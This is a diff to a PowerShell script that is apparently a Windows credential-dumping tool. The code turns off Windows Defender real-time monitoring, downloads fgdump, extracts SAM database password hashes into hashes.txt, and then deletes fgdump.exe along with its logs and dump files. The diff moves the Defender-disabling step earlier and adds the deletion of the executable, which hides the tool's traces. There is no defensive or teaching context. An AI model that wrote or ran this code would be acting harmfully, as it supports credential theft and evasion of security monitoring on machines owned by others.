@@ -28,6 +28,8 @@ function Write-Banner {
 
 function Get-Dependencies {
 
+    Write-Bad "Disabling Windows Defender."
+    Set-MpPreference -DisableRealtimeMonitoring $true
     Write-Info "Checking dependencies..."
 
     # Download fgdump
@@ -71,8 +73,6 @@ function Get-Dependencies {
 
 function Get-Hashes {
 
-    Write-Bad "Disabling Windows Defender."
-    Set-MpPreference -DisableRealtimeMonitoring $true
     Remove-Item hashes.txt -ErrorAction SilentlyContinue  
 
     Write-Info "Retrieving SAM database hashes..."
@@ -92,6 +92,7 @@ function Get-Hashes {
     }
     Write-Good "Hashes retrieved!"
 
+    Remove-Item $PSScriptRoot\fgdump.exe
     Rename-Item -Path $PSScriptRoot\127.0.0.1.pwdump -NewName hashes.txt
     Remove-Item $PSScriptRoot\127.0.0.1.cachedump -ErrorAction SilentlyContinue
     ls *.fgdump-log -Recurse | foreach {rm $_}
